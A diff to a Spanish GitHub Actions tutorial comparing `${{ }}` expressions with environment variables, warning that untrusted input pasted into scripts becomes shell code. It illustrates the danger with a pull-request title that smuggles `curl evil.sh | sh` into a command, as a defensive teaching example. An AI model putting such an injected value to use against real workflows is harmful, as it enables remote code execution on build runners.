@@ -16,7 +16,7 @@ La [lección 1](../01-first-workflow/) mostró que `${{ github.event_name }}` ya
 | Permitido en | casi cualquier valor del YAML, y `if:` | solo dentro de scripts |
 | Analogía en C# | un generador de código fuente: el texto se produce antes de la compilación | una variable leída en tiempo de ejecución |
 
-Como `${{ }}` pega texto en el script, **nunca** pongas directamente valores que no son de confianza — un título de pull request como `"; curl evil.sh | sh; echo "` se convertiría en código de shell. Pásalos por `env:` y lee `$VAR` en su lugar. La lección 7 vuelve sobre ello.
+Como `${{ }}` pega texto en el script, **nunca** pongas directamente valores que no son de confianza — un título de pull request como `"; curl evil.sh | sh; echo "` se convertiría en código de shell. Pásalos por `env:` y lee `$VAR` en su lugar. La [lección 7](../07-security/) ejecuta la inyección de verdad.
 
 ## El workflow
 
